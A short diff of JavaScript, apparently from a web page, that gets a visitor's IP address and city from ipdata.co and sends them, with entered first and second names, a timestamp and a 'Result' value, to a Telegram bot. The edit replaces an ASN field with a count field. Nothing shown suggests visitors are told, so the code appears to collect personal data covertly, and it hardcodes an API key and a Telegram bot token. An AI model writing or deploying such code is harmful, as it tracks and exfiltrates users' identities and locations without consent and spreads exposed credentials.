@@ -91,7 +91,8 @@ let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
 json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
 let data1 = data.ip;
   let city1 = data.city;
- let  asn = data.asn.asn;
+  let checked = data.count;
+
   
 var token ="1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M";
 
@@ -104,7 +105,7 @@ var today = new Date();
    var hour = today.getHours();
    var minute = today.getMinutes();
 
-var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text=  ✦҈͜͡➳✶𝕯𝖆𝖑𝖎𝖆%0A -----------𝑥--------------𝑥-----------𝑥----------- %0A✶•> '+firstName +"%0A✶•> "+secondName + "%0A✶ "+city1+"%0A✶ " + data1 +"%0A✶ Time   ➳ " + day + "/" + month + "/" + year + "  " + hour + ":" + minute + "%0A✶ Result ➳ " +final+'%0A✶ ASN    ➳ '+asn+'%0A------------𝑥--------------𝑥-----------𝑥-----------';
+var url = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text=  ✦҈͜͡➳✶𝕯𝖆𝖑𝖎𝖆%0A -----------𝑥--------------𝑥-----------𝑥----------- %0A✶•> '+firstName +"%0A✶•> "+secondName + "%0A✶ "+city1+"%0A✶ " + data1 +"%0A✶ Time   ➳ " + day + "/" + month + "/" + year + "  " + hour + ":" + minute + "%0A✶ Result ➳ " +final+'%0A✶ Count  ➳ '+checked+'%0A------------𝑥--------------𝑥-----------𝑥-----------';
 console.log(url);
 let api = new XMLHttpRequest();
 
